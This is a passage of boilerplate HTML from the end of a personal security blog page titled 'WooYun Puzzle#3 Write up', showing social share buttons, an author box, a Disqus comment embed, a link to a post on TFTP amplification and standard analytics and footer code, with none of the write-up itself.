            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 28"><path d="M24.253 8.756C24.69 17.08 18.297 24.182 9.97 24.62a15.093 15.093 0 0 1-8.86-2.32c2.702.18 5.375-.648 7.507-2.32a5.417 5.417 0 0 1-4.49-3.64c.802.13 1.62.077 2.4-.154a5.416 5.416 0 0 1-4.412-5.11 5.43 5.43 0 0 0 2.168.387A5.416 5.416 0 0 1 2.89 4.498a15.09 15.09 0 0 0 10.913 5.573 5.185 5.185 0 0 1 3.434-6.48 5.18 5.18 0 0 1 5.546 1.682 9.076 9.076 0 0 0 3.33-1.317 5.038 5.038 0 0 1-2.4 2.942 9.068 9.068 0 0 0 3.02-.85 5.05 5.05 0 0 1-2.48 2.71z"/></svg></span>
            <span class="rrssb-text">twitter</span>
        </a>
    </li>
    <li class="rrssb-linkedin">
        <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://larryxi.github.io/wooyun-pluzze-3-write-up.html&amp;title=不插电 · WooYun Puzzle#3 Write up&amp;summary=不插电 · WooYun Puzzle#3 Write up" class="popup">
            <span class="rrssb-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28">
                    <path d="M25.424 15.887v8.447h-4.896v-7.882c0-1.98-.71-3.33-2.48-3.33-1.354 0-2.158.91-2.514 1.802-.13.315-.162.753-.162 1.194v8.216h-4.9s.067-13.35 0-14.73h4.9v2.087c-.01.017-.023.033-.033.05h.032v-.05c.65-1.002 1.812-2.435 4.414-2.435 3.222 0 5.638 2.106 5.638 6.632zM5.348 2.5c-1.676 0-2.772 1.093-2.772 2.54 0 1.42 1.066 2.538 2.717 2.546h.032c1.71 0 2.77-1.132 2.77-2.546C8.056 3.593 7.02 2.5 5.344 2.5h.005zm-2.48 21.834h4.896V9.604H2.867v14.73z"></path>
                </svg>
            </span>
            <span class="rrssb-text">linkedin</span>
        </a>
    </li>
    <li class="rrssb-googleplus">
        <a href="https://plus.google.com/share?url=https://larryxi.github.io/wooyun-pluzze-3-write-up.html" class="popup">
            <span class="rrssb-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24">
                    <path d="M21 8.29h-1.95v2.6h-2.6v1.82h2.6v2.6H21v-2.6h2.6v-1.885H21V8.29zM7.614 10.306v2.925h3.9c-.26 1.69-1.755 2.925-3.9 2.925-2.34 0-4.29-2.016-4.29-4.354s1.885-4.353 4.29-4.353c1.104 0 2.014.326 2.794 1.105l2.08-2.08c-1.3-1.17-2.924-1.883-4.874-1.883C3.65 4.586.4 7.835.4 11.8s3.25 7.212 7.214 7.212c4.224 0 6.953-2.988 6.953-7.082 0-.52-.065-1.104-.13-1.624H7.614z"></path>
                </svg>
            </span>
            <span class="rrssb-text">google+</span></a>
    </li>
    <li class="rrssb-pinterest">
        <a href="http://pinterest.com/pin/create/button/?url=https://larryxi.github.io/wooyun-pluzze-3-write-up.html&amp;description=不插电 · WooYun Puzzle#3 Write up"><span class="rrssb-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28">
                <path d="M14.02 1.57c-7.06 0-12.784 5.723-12.784 12.785S6.96 27.14 14.02 27.14c7.062 0 12.786-5.725 12.786-12.785 0-7.06-5.724-12.785-12.785-12.785zm1.24 17.085c-1.16-.09-1.648-.666-2.558-1.22-.5 2.627-1.113 5.146-2.925 6.46-.56-3.972.822-6.952 1.462-10.117-1.094-1.84.13-5.545 2.437-4.632 2.837 1.123-2.458 6.842 1.1 7.557 3.71.744 5.226-6.44 2.924-8.775-3.324-3.374-9.677-.077-8.896 4.754.19 1.178 1.408 1.538.49 3.168-2.13-.472-2.764-2.15-2.683-4.388.132-3.662 3.292-6.227 6.46-6.582 4.008-.448 7.772 1.474 8.29 5.24.58 4.254-1.815 8.864-6.1 8.532v.003z"></path>
            </svg></span><span class="rrssb-text">pinterest</span></a>
    </li>
</ul>

</div>


    <div class="container">
    <hr />
    
        
            
        
        
            <div id="img-about">
                <img class="about-img pull-left" src="images/lubang.jpg">
            </div>
        
        <div class="about-stub">
            
                
            
            <a class="different-highlight" href="about">
                <h2 style="font-family: Montserrat">
                    
                        Larryxi
                    
                </h2>
            </a>
            
                <p id="about-description" style="margin-top: 4px;">
                    Jordon says,"JUST DO IT", so I learn IT.

                </p>
            
        </div>
    
</div>
<div style="clear:both"></div>






    <aside id="comments" class="disqus">
    	<div class="container">
    		<h3 class="alignable pull-left"></h3> <h3 class="alignable pull-right"> <i class="icon-disqus"></i></h3>
    		<!--
    	  		Copy the universal code from Disqus. In particular, the div with id #disqus_thread and the following Javascript
    			As an Example see below.
    			Start here
    	   	-->
            <div id="disqus_thread"></div>
                <script>
                    /**
                     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
                     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
                     */
                    /*
                    var disqus_config = function () {
                        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
                        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                    };
                    */
                    (function() {  // DON'T EDIT BELOW THIS LINE
                        var d = document, s = d.createElement('script');
                        
                        s.src = '//larryxi.disqus.com/embed.js';
                        
                        s.setAttribute('data-timestamp', +new Date());
                        (d.head || d.body).appendChild(s);
                    })();
                </script>
                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
    		<!--
    	  		End here
    	  	-->
    </aside>



        </div>
    </div>
    <footer>
    

    
    <div class="container page-suggestion">
        
        
            <a class="button alignable pull-right" href="https://larryxi.github.io/tftp-reflection-and-amplification-attack.html">
                TFTP反射放大攻击浅析 &rarr;
            </a>
        
    </div>
    <div style="clear:both"></div>


    
    <hr />
    <div class="user-footer">
        <!--more<div class="copyright alignable pull-left">
            
                <h2> &copy;accent</h2>
            
        </div>-->
        <div class="alignable pull-left">
            <p class="faded"><!-- class="alignable pull-left" style="display: inline-block">-->
            Built with <a href="http://jekyllrb.com/" class="different-highlight underline">Jekyll</a> and <a href="http://ankitsultana.me/accent/" class="different-highlight underline">accent</a>
            </p>
        </div>
        <div class="alignable pull-right">
            <a target="_blank" href="http://weibo.com/u/3996118191" class="button">
                @Larryxi
            </a>
            <a href="mailto:larrycompress@gmail.com" class="button">
                mail
            </a>
            <a target="_blank" href="https://larryxi.github.io/feed.xml" class="button">
                rss
            </a>
        </div>
    </div>
    <!--<div style="clear:both"></div>
    <hr />
    <div class="theme-footer">
        <p class="alignable pull-left" style="display: inline-block">
            Built with <a href="http://jekyllrb.com/" class="different-highlight underline">Jekyll</a> and <a href="http://ankitsultana.me/accent/" class="different-highlight underline">accent</a>
        </p>
    </div>-->
</footer>

    <script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="/js/rrssb.min.js"></script>

    
        <script src="js/anchor.min.js"></script>
        <script>
        anchors.options.placement = 'right'
        anchors.options.class = 'hide'
        anchors.add()
        anchors.remove('.post-title')
        </script>
    
    
        <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-80180060-1# GA Tracking ID', 'auto');
  ga('send', 'pageview');

</script>

    
</body>
